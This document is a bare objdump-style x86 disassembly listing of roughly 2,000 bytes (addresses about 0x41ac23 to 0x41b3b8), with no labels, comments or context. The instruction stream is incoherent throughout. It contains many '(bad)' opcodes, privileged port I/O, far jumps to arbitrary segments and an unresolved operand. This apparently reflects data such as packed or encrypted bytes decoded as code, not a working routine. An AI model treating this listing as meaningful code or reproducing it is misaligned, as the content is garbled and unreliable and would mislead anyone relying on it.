  41ac23:	dec    esp
  41ac24:	pop    edi
  41ac25:	pop    esp
  41ac26:	cmp    ebx,DWORD PTR cs:[ebp+0xcc108ae]
  41ac2d:	dec    ebp
  41ac2e:	cwde   
  41ac2f:	test   DWORD PTR [esi],0x92d67941
  41ac35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac36:	pop    esi
  41ac37:	fucom  st(0)
  41ac39:	scas   al,BYTE PTR es:[edi]
  41ac3a:	psadbw mm4,QWORD PTR [ebx+0x12]
  41ac3e:	out    0x54,eax
  41ac40:	mov    WORD PTR [ebp-0x3eed0fe2],fs
  41ac46:	xor    eax,0x29c0735f
  41ac4b:	fcomip st,st(0)
  41ac4d:	jp     0x41ac15
  41ac4f:	add    BYTE PTR [edx+0x21e3b368],dh
  41ac55:	int3   
  41ac56:	and    DWORD PTR [edi],0xffffffaf
  41ac59:	mov    esp,edx
  41ac5b:	adc    DWORD PTR [eax-0xa],esp
  41ac5e:	xor    dh,BYTE PTR [edx]
  41ac60:	inc    ebx
  41ac61:	adc    BYTE PTR [edi+0x4b],al
  41ac64:	mov    bl,0x61
  41ac66:	add    DWORD PTR ds:0xc9c36cb8,esi
  41ac6c:	dec    esp
  41ac6d:	aad    0x2b
  41ac6f:	fcmovb st,st(2)
  41ac71:	xchg   ebx,eax
  41ac72:	loopne 0x41ac94
  41ac74:	scas   al,BYTE PTR es:[edi]
  41ac75:	adc    dl,BYTE PTR [esi-0x2e]
  41ac78:	fcmovnb st,st(1)
  41ac7a:	push   ds
  41ac7b:	sar    DWORD PTR [edi],cl
  41ac7d:	adc    ebx,ecx
  41ac7f:	push   esi
  41ac80:	mov    ebx,0x25df31ec
  41ac85:	nop
  41ac86:	mov    bh,0x1c
  41ac88:	pop    ss
  41ac89:	dec    edx
  41ac8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac8b:	aad    0x72
  41ac8d:	aaa    
  41ac8e:	jmp    0x21e7:0x8495f1dc
  41ac95:	test   al,0x15
  41ac97:	inc    edi
  41ac98:	sub    DWORD PTR [esi],ecx
  41ac9a:	xchg   ebp,eax
  41ac9b:	mov    bl,BYTE PTR [ebx+0x33]
  41ac9e:	and    eax,0xf18f17a9
  41aca3:	pop    esp
  41aca4:	sub    bl,BYTE PTR [ebx+0x34]
  41aca7:	scas   eax,DWORD PTR es:[edi]
  41aca8:	cld    
  41aca9:	ins    DWORD PTR es:[edi],dx
  41acaa:	inc    DWORD PTR [ebp+0x1c]
  41acad:	pop    ecx
  41acae:	ins    BYTE PTR es:[edi],dx
  41acaf:	inc    esi
  41acb0:	push   0x2acf31c7
  41acb5:	xor    DWORD PTR [eax],ecx
  41acb7:	sub    eax,0x630c4fdc
  41acbc:	ss mov esi,0xe74ee0c9
  41acc2:	cmp    edx,edi
  41acc4:	pop    ds
  41acc5:	pop    ecx
  41acc6:	punpckldq mm7,mm7
  41acc9:	add    cl,dh
  41accb:	jne    0x41ad31
  41accd:	adc    ah,ah
  41accf:	out    dx,al
  41acd0:	jnp    0x41ac67
  41acd2:	sub    ah,BYTE PTR [esi+0x46baab38]
  41acd8:	jp     0x41acfd
  41acda:	imul   edi,DWORD PTR [eax+0x67],0x20cde731
  41ace1:	test   al,0x0
  41ace3:	mov    ebx,0x64bf8671
  41ace8:	cmp    DWORD PTR [ecx-0x12c9f733],ebp
  41acee:	loop   0x41ad28
  41acf0:	jp     0x41ad6e
  41acf2:	out    dx,al
  41acf3:	(bad)  
  41acf4:	stos   DWORD PTR es:[edi],eax
  41acf5:	jmp    0x92eb:0xb159af65
  41acfc:	adc    ch,BYTE PTR ds:[ebx+0x1dfa1e86]
  41ad03:	mov    bl,0x92
  41ad05:	add    eax,ecx
  41ad07:	inc    esi
  41ad08:	pop    ss
  41ad09:	aad    0x49
  41ad0b:	xchg   esi,eax
  41ad0c:	aas    
  41ad0d:	cmp    al,0x86
  41ad0f:	popa   
  41ad10:	push   esp
  41ad11:	xchg   DWORD PTR [ebp-0x3ca4fed6],esp
  41ad17:	sub    ch,bl
  41ad19:	pop    es
  41ad1a:	add    eax,ebx
  41ad1c:	jecxz  0x41ad20
  41ad1e:	fld    DWORD PTR [ebx+0x439a5cf3]
  41ad24:	inc    eax
  41ad25:	pop    ds
  41ad26:	fadd   DWORD PTR [esp+edx*4-0x7421dfe4]
  41ad2d:	inc    ecx
  41ad2e:	sar    DWORD PTR [esi-0xa4d42a0],cl
  41ad34:	and    eax,0xaf908018
  41ad39:	cli    
  41ad3a:	std    
  41ad3b:	inc    ebx
  41ad3c:	cmp    BYTE PTR [ebp+0x2eba7ed6],cl
  41ad42:	imul   esp,DWORD PTR [edi],0x47
  41ad45:	xchg   esi,eax
  41ad46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad47:	popf   
  41ad48:	xor    al,0x1
  41ad4a:	jae    0x41ad2f
  41ad4c:	jmp    0x41ad95
  41ad4e:	(bad)  
  41ad4f:	mov    dh,0x14
  41ad51:	xchg   esp,eax
  41ad52:	imul   edi,eax,0x7f
  41ad55:	mov    bl,0xfe
  41ad57:	pop    es
  41ad58:	shl    BYTE PTR [ecx],1
  41ad5a:	sub    ch,ah
  41ad5c:	mov    dh,0x2d
  41ad5e:	push   edi
  41ad5f:	in     al,dx
  41ad60:	ret    0x24e9
  41ad63:	push   ebp
  41ad64:	push   eax
  41ad65:	call   0xcee:0x6d33daed
  41ad6c:	add    ch,bh
  41ad6e:	push   cs
  41ad6f:	test   al,0x88
  41ad71:	loope  0x41acf7
  41ad73:	loope  0x41adab
  41ad75:	pop    ss
  41ad76:	and    DWORD PTR [esi],0x1915f1af
  41ad7c:	mov    ds:0xecdee84a,al
  41ad81:	dec    edx
  41ad82:	pusha  
  41ad83:	aaa    
  41ad84:	push   edi
  41ad85:	gs jecxz 0x41ad08
  41ad88:	xchg   edx,eax
  41ad89:	inc    edi
  41ad8a:	leave  
  41ad8b:	adc    cl,bl
  41ad8d:	sub    bh,BYTE PTR [ecx+0x37]
  41ad90:	lods   eax,DWORD PTR ds:[esi]
  41ad91:	test   al,0x8b
  41ad93:	mov    eax,0xacf6c9d5
  41ad98:	cwde   
  41ad99:	jecxz  0x41ad67
  41ad9b:	xchg   edi,eax
  41ad9c:	js     0x41add5
  41ad9e:	mov    ecx,0x22e19553
  41ada3:	jnp    0x41ad4f
  41ada5:	add    ebp,DWORD PTR [ecx-0x81ba6ad]
  41adab:	xchg   BYTE PTR [eax-0x112ec153],al
  41adb1:	je     0x41ae2e
  41adb3:	mov    gs,WORD PTR [eax]
  41adb5:	mov    dh,0x73
  41adb7:	aas    
  41adb8:	stc    
  41adb9:	lods   eax,DWORD PTR ds:[esi]
  41adba:	xor    eax,0x89b77292
  41adbf:	lea    edi,[esp+edx*2]
  41adc2:	outs   dx,DWORD PTR ds:[esi]
  41adc3:	aam    0x11
  41adc5:	dec    edx
  41adc6:	pop    edx
  41adc7:	mov    cl,BYTE PTR [edx-0x41]
  41adca:	hlt    
  41adcb:	leave  
  41adcc:	jmp    0x41ade3
  41adce:	xchg   ebx,eax
  41adcf:	ret    0xdfe5
  41add2:	rcl    DWORD PTR [edx-0x6337ae8e],0x72
  41add9:	xor    DWORD PTR [edx-0x35],0xeae09b29
  41ade0:	pushf  
  41ade1:	in     al,0x22
  41ade3:	(bad)  
  41ade4:	mov    bl,0x51
  41ade6:	fild   DWORD PTR [esi]
  41ade8:	mov    al,0x21
  41adea:	aas    
  41adeb:	mov    ch,0x25
  41aded:	out    dx,al
  41adee:	xchg   DWORD PTR [eax+0x22],edx
  41adf1:	jne    0x41adcb
  41adf3:	inc    edx
  41adf4:	push   ecx
  41adf5:	jo     0x41ae21
  41adf7:	dec    esi
  41adf8:	(bad)  
  41adf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adfa:	jno    0x41add1
  41adfc:	add    eax,0x2decc731
  41ae01:	mov    BYTE PTR [edx],0x79
  41ae04:	pushf  
  41ae05:	push   esi
  41ae06:	rol    DWORD PTR [esi-0x68456091],0x26
  41ae0d:	sbb    al,0x47
  41ae0f:	add    dh,BYTE PTR [esi]
  41ae11:	or     eax,0x21278b2d
  41ae16:	dec    esp
  41ae17:	or     al,0xef
  41ae19:	ins    DWORD PTR es:[edi],dx
  41ae1a:	push   esi
  41ae1b:	and    DWORD PTR [esi],ebx
  41ae1d:	lahf   
  41ae1e:	data16 sub dl,bl
  41ae21:	ret    
  41ae22:	scas   eax,DWORD PTR es:[edi]
  41ae23:	shl    DWORD PTR [edx],1
  41ae25:	push   ecx
  41ae26:	inc    eax
  41ae27:	(bad)  [ebp+esi*1+0x7c]
  41ae2b:	mov    ds:0xc2e03333,eax
  41ae30:	pop    eax
  41ae31:	test   DWORD PTR [ecx],edi
  41ae33:	out    0x62,eax
  41ae35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae36:	into   
  41ae37:	popf   
  41ae38:	inc    esi
  41ae39:	cdq    
  41ae3a:	jns    0x41ae55
  41ae3c:	mov    al,BYTE PTR [ecx]
  41ae3e:	push   ebx
  41ae3f:	stos   BYTE PTR es:[edi],al
  41ae40:	cmp    eax,0xc7d9cbcd
  41ae45:	push   ss
  41ae46:	or     al,al
  41ae48:	mov    eax,0x3fef6048
  41ae4d:	cmp    DWORD PTR [edx],ebp
  41ae4f:	or     eax,0xef368265
  41ae54:	xor    DWORD PTR [edi],esi
  41ae56:	fidiv  DWORD PTR [ebx-0x6a]
  41ae59:	mov    eax,0xff57112d
  41ae5e:	sub    bl,BYTE PTR [edi-0xd]
  41ae61:	pop    esp
  41ae62:	and    eax,0x2c97f2bb
  41ae67:	push   esp
  41ae68:	mov    esi,0x27c2d8b7
  41ae6d:	lea    ebp,[edi+eax*4+0x1f]
  41ae71:	js     0x41ae75
  41ae73:	xor    eax,0xea0f1b20
  41ae78:	jmp    0x41ae5b
  41ae7a:	stos   DWORD PTR es:[edi],eax
  41ae7b:	and    edi,0x32104497
  41ae81:	popf   
  41ae82:	fwait
  41ae83:	adc    eax,0x4a6e5b20
  41ae88:	dec    ch
  41ae8a:	adc    DWORD PTR ds:0x4c565b26,0xfffffffd
  41ae91:	sti    
  41ae92:	and    al,0x79
  41ae94:	jmp    0xee58ca06
  41ae99:	mov    bh,0x7b
  41ae9b:	popf   
  41ae9c:	sbb    dl,BYTE PTR [edx]
  41ae9e:	ror    dh,1
  41aea0:	inc    ebx
  41aea1:	loope  0x41aed5
  41aea3:	add    DWORD PTR [esi-0x17],ebp
  41aea6:	jno    0x41af0b
  41aea8:	cmc    
  41aea9:	icebp  
  41aeaa:	jno    0x41ae47
  41aeac:	push   0x7c
  41aeae:	fwait
  41aeaf:	xchg   ebx,eax
  41aeb0:	icebp  
  41aeb1:	loope  0x41af18
  41aeb3:	fisttp DWORD PTR [ebx]
  41aeb5:	cmp    al,0x34
  41aeb7:	mov    BYTE PTR [edi-0x1],bl
  41aeba:	mov    dl,0xeb
  41aebc:	std    
  41aebd:	mov    eax,ds:0x26eea985
  41aec2:	sub    dl,BYTE PTR [ebx-0x22]
  41aec5:	add    BYTE PTR [eax+0x52],ch
  41aec8:	inc    esp
  41aec9:	ins    DWORD PTR es:[edi],dx
  41aeca:	jo     0x41aeab
  41aecc:	test   al,0x97
  41aece:	and    edx,DWORD PTR [edx-0x3e]
  41aed1:	push   eax
  41aed2:	(bad)  
  41aed4:	xor    edx,ecx
  41aed6:	cmp    ebx,DWORD PTR [edi]
  41aed8:	inc    esp
  41aed9:	jns    0x41af08
  41aedb:	iret   
  41aedc:	xchg   ecx,eax
  41aedd:	push   eax
  41aede:	inc    esi
  41aedf:	xor    DWORD PTR [ebx],eax
  41aee1:	test   eax,0x9cdfb2b8
  41aee6:	dec    ebp
  41aee7:	ds sbb edi,ecx
  41aeea:	(bad)  
  41aeec:	xor    ebp,DWORD PTR [ebx+0x3e]
  41aeef:	es mov cl,dl
  41aef2:	add    dl,BYTE PTR [edx-0x26]
  41aef5:	ja     0x41ae8b
  41aef7:	xchg   edx,eax
  41aef8:	mov    al,0x0
  41aefa:	mov    esp,0x2432e4
  41aeff:	mov    eax,ds:0xcc47fe7e
  41af04:	jno    0x41af42
  41af06:	dec    ebp
  41af07:	gs out 0x1e,eax
  41af0a:	scas   al,BYTE PTR es:[edi]
  41af0b:	mov    ch,bh
  41af0d:	xchg   esi,eax
  41af0e:	fdivr  st(0),st
  41af10:	sub    dl,BYTE PTR [edi+0x2af1fded]
  41af16:	bound  ebp,QWORD PTR [esp+eiz*2+0x1e]
  41af1a:	add    al,BYTE PTR ds:0x5623d1d8
  41af20:	ret    
  41af21:	lods   al,BYTE PTR ds:[esi]
  41af22:	iret   
  41af23:	sub    al,0xd8
  41af25:	mov    cl,BYTE PTR [edi+0x71b4edeb]
  41af2b:	xor    eax,0xbe7a58db
  41af30:	cmp    bh,BYTE PTR [esi-0x53]
  41af33:	dec    ebx
  41af34:	repnz loop 0x41af60
  41af37:	push   esi
  41af38:	out    0x86,eax
  41af3a:	and    DWORD PTR [esi-0x1],0x62
  41af3e:	inc    edi
  41af3f:	push   cs
  41af40:	repnz or dh,BYTE PTR [ecx+0xa]
  41af44:	in     al,0x8a
  41af46:	hlt    
  41af47:	shl    cl,cl
  41af49:	hlt    
  41af4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af4b:	mov    dh,0x57
  41af4d:	xor    eax,eax
  41af4f:	in     al,dx
  41af50:	fwait
  41af51:	dec    ebp
  41af52:	dec    ecx
  41af53:	mov    ch,0x7a
  41af55:	pusha  
  41af56:	ror    DWORD PTR [ebp+0x4c9ec307],0x70
  41af5d:	xchg   DWORD PTR [eax+0x15663055],eax
  41af63:	adc    eax,0x8d84830a
  41af68:	pop    ecx
  41af69:	mov    ch,0xf9
  41af6b:	out    dx,al
  41af6c:	mov    ebp,0x81a285c6
  41af71:	(bad)  
  41af72:	cmp    dh,BYTE PTR [ebx-0xe4262d5]
  41af78:	div    BYTE PTR [eax-0x2c]
  41af7b:	jmp    0x7d827e48
  41af80:	add    cl,bh
  41af82:	mov    al,0xd7
  41af84:	fs jmp 0x41af27
  41af87:	fisubr DWORD PTR [eax]
  41af89:	jb     0x41afa5
  41af8b:	mov    al,ds:0xb38ddcf
  41af90:	cmp    esi,DWORD PTR [edi+0x68374a0d]
  41af96:	clc    
  41af97:	jmp    0xb36356e9
  41af9c:	xchg   DWORD PTR [eax+0x7ffaabe1],ebx
  41afa2:	sbb    ecx,DWORD PTR [eax-0x52]
  41afa5:	mov    edi,0xccd0ed5
  41afaa:	fnstenv [ebp-0x28]
  41afad:	dec    eax
  41afae:	mov    al,0xe5
  41afb0:	call   0x33e99151
  41afb5:	cmp    ah,BYTE PTR [edi+0x7da6e8e]
  41afbb:	mov    edx,0x84806f4d
  41afc0:	jb     0x41af72
  41afc2:	inc    esp
  41afc3:	mov    esp,0x272bc2b3
  41afc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afc9:	js     0x41b048
  41afcb:	ret    
  41afcc:	adc    ebx,DWORD PTR [eax+0xc1b7fe4]
  41afd2:	repnz retf 
  41afd4:	adc    BYTE PTR [ecx+0x5a715c0],dh
  41afda:	pop    ds
  41afdb:	push   ebp
  41afdc:	push   edi
  41afdd:	addr16 rcr dl,1
  41afe0:	pop    ebp
  41afe1:	std    
  41afe2:	sub    eax,0xc86f8d89
  41afe7:	rcl    BYTE PTR [ebp-0x7],cl
  41afea:	and    eax,0xc04c2c8d
  41afef:	jns    0x41b047
  41aff1:	and    BYTE PTR [edx],0x88
  41aff4:	push   0x38d4eab0
  41aff9:	fisub  DWORD PTR ds:[ebp+0x64]
  41affd:	or     dl,BYTE PTR [edx-0x26]
  41b000:	les    edx,FWORD PTR [edx]
  41b002:	sbb    DWORD PTR [eax],edx
  41b004:	xchg   dl,dh
  41b006:	hlt    
  41b007:	pop    edi
  41b008:	pop    esp
  41b009:	je     0x41b01c
  41b00b:	outs   dx,BYTE PTR ds:[esi]
  41b00c:	test   BYTE PTR ds:0xafe504dd,bh
  41b012:	cmp    al,0x5a
  41b014:	cmp    al,0x35
  41b016:	fld    QWORD PTR [edx]
  41b018:	in     eax,0xa7
  41b01a:	cmp    al,0x5c
  41b01c:	cmp    cl,BYTE PTR ds:0x93e9b405
  41b022:	rcr    BYTE PTR [ebp-0x15500bff],0x94
  41b029:	jmp    0x21c3:0xaf22e1a4
  41b030:	push   0xffffffcd
  41b032:	xchg   ebp,eax
  41b033:	mov    edi,0x1a18c396
  41b038:	xor    ah,BYTE PTR [edx+0x343dca19]
  41b03e:	test   DWORD PTR [edi+0xbdbe467],ecx
  41b044:	fistp  DWORD PTR [esi+0x231fa252]
  41b04a:	add    BYTE PTR ds:0xd18bac1e,dh
  41b050:	pop    esi
  41b051:	int3   
  41b052:	aad    0xd4
  41b054:	scas   eax,DWORD PTR es:[edi]
  41b055:	fidivr DWORD PTR [ebp+0xc]
  41b058:	shl    esp,0xda
  41b05b:	add    al,0xe
  41b05d:	sub    eax,0x81cc8066
  41b062:	xor    al,0x19
  41b064:	cmc    
  41b065:	out    0xf6,al
  41b067:	sub    al,0xc3
  41b069:	in     al,dx
  41b06a:	or     ch,0x40
  41b06d:	sti    
  41b06e:	cs pop edi
  41b071:	inc    ebp
  41b072:	mov    ds:0x4b455fcc,eax
  41b077:	ins    BYTE PTR es:[edi],dx
  41b078:	cmp    ebp,DWORD PTR [edi+0x56]
  41b07b:	cmc    
  41b07c:	retf   
  41b07d:	nop
  41b07e:	in     al,0x4f
  41b080:	cmc    
  41b081:	xchg   ebx,eax
  41b082:	and    al,0xfc
  41b084:	push   esi
  41b085:	sbb    BYTE PTR [ebx-0x8],cl
  41b088:	clc    
  41b089:	and    BYTE PTR [ecx+0x19],0x41
  41b08d:	or     esp,ebx
  41b08f:	mov    ?,esp
  41b091:	lock (bad) 
  41b093:	(bad)  
  41b094:	push   edi
  41b095:	jne    0x41b027
  41b097:	add    eax,0x9aeb58ea
  41b09c:	fs mov bh,0xc9
  41b09f:	pop    ebp
  41b0a0:	call   0x3237c35e
  41b0a5:	and    dh,bl
  41b0a7:	mov    eax,ds:0x4330a3e8
  41b0ac:	cmp    al,BYTE PTR [esi-0x46ca99a5]
  41b0b2:	add    BYTE PTR [edi*4+0xd5e0821],al
  41b0b9:	push   ss
  41b0ba:	jp     0x41b090
  41b0bc:	cmp    DWORD PTR [edx],esi
  41b0be:	int3   
  41b0bf:	mov    ds:0x3e7bf1f3,al
  41b0c4:	jo     0x41b0aa
  41b0c6:	push   ecx
  41b0c7:	out    dx,al
  41b0c8:	cwde   
  41b0c9:	inc    ecx
  41b0ca:	aam    0xf9
  41b0cc:	xchg   esp,eax
  41b0cd:	push   ecx
  41b0ce:	ss add ah,ch
  41b0d1:	xchg   ebp,eax
  41b0d2:	retf   
  41b0d3:	sub    dl,bh
  41b0d5:	fcmovb st,st(6)
  41b0d7:	mov    ds:0x1d258817,al
  41b0dc:	sub    esp,DWORD PTR [edx-0x6ee8f948]
  41b0e2:	bound  ebx,QWORD PTR [ecx]
  41b0e4:	mov    ds:0xc69a6063,eax
  41b0e9:	lds    esi,FWORD PTR [esi]
  41b0eb:	stc    
  41b0ec:	or     DWORD PTR [esi-0x1e],ebp
  41b0ef:	inc    ebx
  41b0f0:	shl    cl,1
  41b0f2:	cmp    BYTE PTR [ebx+esi*4],cl
  41b0f5:	cmp    eax,0xffaf46e9
  41b0fa:	add    DWORD PTR [ebx+0x11],edi
  41b0fd:	sbb    edi,DWORD PTR [esi+0x1b9cbf50]
  41b103:	sti    
  41b104:	(bad)  
  41b105:	push   ss
  41b106:	ja     0x41b0fa
  41b108:	push   cs
  41b109:	test   dl,0xd3
  41b10c:	stc    
  41b10d:	sbb    al,0xde
  41b10f:	out    0xef,eax
  41b111:	icebp  
  41b112:	lds    edx,FWORD PTR [ebp+0x2]
  41b115:	loopne 0x41b14b
  41b117:	mov    bl,0x1c
  41b119:	fs jne 0x41b15d
  41b11c:	arpl   WORD PTR [ecx-0x38],ax
  41b11f:	cld    
  41b120:	rol    DWORD PTR [eax+0x1b189be8],cl
  41b126:	ja     0x41b180
  41b128:	xchg   bl,dl
  41b12a:	das    
  41b12b:	inc    eax
  41b12c:	arpl   WORD PTR [ebp-0x41f319aa],dx
  41b132:	xchg   ecx,eax
  41b133:	js     0x41b0bc
  41b135:	jns    0x41b0f5
  41b137:	test   DWORD PTR [edx-0x17],esp
  41b13a:	add    DWORD PTR [edx],0xffffff8d
  41b13d:	scas   eax,DWORD PTR es:[edi]
  41b13e:	mov    ecx,0x41d6a889
  41b143:	js     0x41b17e
  41b145:	xchg   dl,dh
  41b147:	push   es
  41b148:	addr16 dec ebp
  41b14a:	(bad)  
  41b14b:	ret    
  41b14c:	inc    edi
  41b14d:	ss in  al,dx
  41b14f:	es mov bl,0xd7
  41b152:	hlt    
  41b153:	hlt    
  41b154:	retf   
  41b155:	out    0xb0,al
  41b157:	stc    
  41b158:	mov    edi,0x873b9a39
  41b15d:	repz fiadd WORD PTR [ebp+0x17f69be4]
  41b164:	scas   al,BYTE PTR es:[edi]
  41b165:	not    edx
  41b167:	data16 addr16 sahf 
  41b16a:	mov    dl,0x6e
  41b16c:	or     eax,DWORD PTR [esi+0x470f6ee1]
  41b172:	xchg   ebx,eax
  41b173:	add    al,0x33
  41b175:	mov    al,0x30
  41b177:	and    esp,DWORD PTR [edx+0x49]
  41b17a:	and    DWORD PTR [ebp+0x44],ecx
  41b17d:	cld    
  41b17e:	add    BYTE PTR [edx-0x44a9e03c],bh
  41b184:	cmp    DWORD PTR ds:0x919092d6,0x125f7582
  41b18e:	mov    edx,0x4541fbbd
  41b193:	(bad)  
  41b194:	cmp    bl,bl
  41b196:	mov    ebp,0xfbd4eab7
  41b19b:	cwde   
  41b19c:	ret    0x4347
  41b19f:	lods   al,BYTE PTR ds:[esi]
  41b1a0:	out    dx,al
  41b1a1:	mov    al,ds:0x8937ddeb
  41b1a6:	dec    ebx
  41b1a7:	stos   BYTE PTR es:[edi],al
  41b1a8:	call   0x47e3675e
  41b1ad:	stos   DWORD PTR es:[edi],eax
  41b1ae:	jmp    0x41b18e
  41b1b0:	mov    esi,0x7fc94f51
  41b1b5:	push   ebx
  41b1b6:	inc    eax
  41b1b7:	mov    esi,0x7dfa9392
  41b1bc:	pop    ebx
  41b1bd:	and    eax,0x973a2f41
  41b1c2:	dec    ebx
  41b1c3:	or     esi,DWORD PTR [bx+di+0x5e]
  41b1c7:	xchg   DWORD PTR [esi-0x70],ebx
  41b1ca:	es xchg ecx,eax
  41b1cc:	(bad)  
  41b1ce:	mov    edx,0xab197eee
  41b1d3:	sbb    eax,0x1aca9448
  41b1d8:	jl     0x41b16e
  41b1da:	or     ecx,DWORD PTR [ecx+0x6e5a9f84]
  41b1e0:	shl    DWORD PTR [ebp+0x31],cl
  41b1e3:	jo     0x41b16c
  41b1e5:	sbb    al,0xb8
  41b1e7:	out    dx,al
  41b1e8:	jge    0x41b24f
  41b1ea:	stos   BYTE PTR es:[edi],al
  41b1eb:	sub    eax,0xfcf12f68
  41b1f0:	rcr    DWORD PTR [ebp+0x6b77880a],cl
  41b1f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1f7:	or     al,0xd3
  41b1f9:	shl    BYTE PTR [ebx+0x529a22fa],0x88
  41b200:	fisub  DWORD PTR ds:0xd793b52a
  41b206:	dec    ebx
  41b207:	js     0x41b1f1
  41b209:	arpl   WORD PTR [edi],ax
  41b20b:	add    eax,0xa6bf0367
  41b210:	ficom  DWORD PTR [ebx+edx*1]
  41b213:	shl    DWORD PTR [ecx+0x57],cl
  41b216:	xchg   edx,eax
  41b217:	retf   0xf973
  41b21a:	xor    DWORD PTR [ebp+0x7],esp
  41b21d:	mov    bl,0x8a
  41b21f:	adc    al,0x6b
  41b221:	ja     0x41b25b
  41b223:	cmc    
  41b224:	pop    ebp
  41b225:	dec    edx
  41b226:	loopne 0x41b1cf
  41b228:	into   
  41b229:	shr    DWORD PTR [ebx-0x51],0xaa
  41b22d:	shl    BYTE PTR gs:[esi],1
  41b230:	fisub  WORD PTR [edi]
  41b232:	imul   ecx,DWORD PTR [ecx-0x4e],0xffffffd9
  41b236:	loopne 0x41b286
  41b238:	sbb    bh,dl
  41b23a:	mov    ds:0xe62731ed,al
  41b23f:	loop   0x41b1f3
  41b241:	(bad)  [edx-0x7962fe75]
  41b247:	or     BYTE PTR [edx+0xf],al
  41b24a:	daa    
  41b24b:	lock inc ecx
  41b24d:	sbb    dh,0xe4
  41b250:	fmul   DWORD PTR [ebx+ecx*1-0x7d18d64b]
  41b257:	sub    eax,0xe3e90c18
  41b25c:	mov    edi,DWORD PTR [ebx]
  41b25e:	ret    
  41b25f:	mov    esp,0x8d5fc99c
  41b264:	sub    al,BYTE PTR [ecx+0x35e80e4b]
  41b26a:	pop    es
  41b26b:	xor    DWORD PTR [ebx-0x21],ebp
  41b26e:	push   ebx
  41b26f:	jbe    0x41b249
  41b271:	imul   esp,DWORD PTR [edi+0xd],0x8ca3df35
  41b278:	repz neg edx
  41b27b:	mov    ecx,0xdfaea51b
  41b280:	imul   ecx,DWORD PTR [ebp+edi*8+0x2404d178],0xffffffdc
  41b288:	mov    bl,0x4d
  41b28a:	sub    al,bh
  41b28c:	mov    dl,0x5f
  41b28e:	loopne 0x41b282
  41b290:	mov    esi,0xb7785de9
  41b295:	add    DWORD PTR [edx-0x76],esp
  41b298:	push   eax
  41b299:	int    0xe3
  41b29b:	pusha  
  41b29c:	div    DWORD PTR [ecx]
  41b29e:	sub    al,0x8e
  41b2a0:	cld    
  41b2a1:	mul    BYTE PTR [edi-0x15]
  41b2a4:	or     ebx,DWORD PTR [edx-0x5e4f4308]
  41b2aa:	jne    0x41b265
  41b2ac:	dec    ebp
  41b2ad:	add    BYTE PTR [eax-0x74],0x66
  41b2b1:	ror    DWORD PTR [ebx-0x4d6c54b5],0x2f
  41b2b8:	and    BYTE PTR [edi],bl
  41b2ba:	xor    bl,BYTE PTR [ebx]
  41b2bc:	sub    dl,BYTE PTR [ecx+0x27]
  41b2bf:	adc    BYTE PTR [edx],0x6c
  41b2c2:	add    DWORD PTR ds:0x92cb2332,edi
  41b2c8:	jae    0x41b293
  41b2ca:	xor    DWORD PTR [edi+0x268a6f07],edx
  41b2d0:	imul   ebx,DWORD PTR ds:0xa5675901,0x8
  41b2d7:	daa    
  41b2d8:	es xchg edi,eax
  41b2da:	retf   
  41b2db:	aad    0xdf
  41b2dd:	inc    eax
  41b2de:	fild   DWORD PTR [edx+esi*8+0x7c1319b]
  41b2e5:	sub    eax,0xf96bf68a
  41b2ea:	adc    BYTE PTR [ebx-0x581f8816],al
  41b2f0:	scas   al,BYTE PTR es:[edi]
  41b2f1:	shl    DWORD PTR [ebp-0x39],0xaa
  41b2f5:	xor    eax,0x8ddeb8d0
  41b2fa:	addr16 or eax,0x5f521f4c
  41b300:	or     BYTE PTR [ebp+0x2a],0x95
  41b304:	mov    dl,0x41
  41b306:	loopne 0x41b29c
  41b308:	mov    esi,0x257835af
  41b30d:	add    BYTE PTR [esi],dh
  41b30f:	pushf  
  41b310:	stos   DWORD PTR es:[edi],eax
  41b311:	arpl   WORD PTR [edx],bp
  41b313:	sub    DWORD PTR [edi],eax
  41b315:	fisttp WORD PTR [edx+0x10296b12]
  41b31b:	in     eax,0xd2
  41b31d:	xor    ecx,0xffffffbf
  41b320:	sbb    BYTE PTR [ecx+esi*8],cl
  41b323:	shr    DWORD PTR [edx],cl
  41b325:	rol    DWORD PTR [esi-0x5af3a7e4],1
  41b32b:	jecxz  0x41b384
  41b32d:	aaa    
  41b32e:	mov    al,ds:0x6714a8e6
  41b333:	ror    DWORD PTR ds:0x72aad457,cl
  41b339:	imul   ecx,DWORD PTR [ebp+0x28],0xbc081a82
  41b340:	dec    eax
  41b341:	mov    eax,ds:0x8259b9b5
  41b346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b347:	mov    esi,0xbb10e902
  41b34c:	xor    ch,BYTE PTR ds:0xc1d2a7e0
  41b352:	add    esp,ecx
  41b354:	test   al,0xe7
  41b356:	xchg   BYTE PTR [edx-0x69],bl
  41b359:	(bad)  
  41b35a:	ret    
  41b35b:	pusha  
  41b35c:	out    dx,eax
  41b35d:	xor    DWORD PTR [edx+ebp*8+0x50],edi
  41b361:	sbb    ebp,DWORD PTR [edx-0x196ece9f]
  41b367:	fidiv  DWORD PTR [edx+0x1adb2ed]
  41b36d:	push   edi
  41b36e:	xchg   BYTE PTR [esi+ebx*8-0x141fd2f4],bl
  41b375:	pusha  
  41b376:	in     al,0x46
  41b378:	loope  0x41b3eb
  41b37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b37b:	js     0x41b37e
  41b37d:	sbb    cl,BYTE PTR [esp+ebp*1]
  41b380:	sti    
  41b381:	stc    
  41b382:	mov    edx,0x1b1ba3fa
  41b387:	and    eax,DWORD PTR [esi-0x16]
  41b38a:	push   es
  41b38b:	popw   ss
  41b38d:	aaa    
  41b38e:	or     edi,DWORD PTR [edx+0x6b]
  41b391:	mov    WORD PTR [ebx-0x4f],es
  41b394:	and    ch,BYTE PTR [ebp-0x634364f2]
  41b39a:	sbb    DWORD PTR [ecx],edi
  41b39c:	sub    bh,BYTE PTR [ebx]
  41b39e:	push   ebx
  41b39f:	mov    edx,0x54581d8
  41b3a4:	adc    dh,bh
  41b3a6:	retf   
  41b3a7:	jmp    0xdf89:0x8e635328
  41b3ae:	sar    DWORD PTR [eax],cl
  41b3b0:	repz or eax,0x773189aa
  41b3b6:	out    0xf6,al
  41b3b8:	mov    dl,0xc9
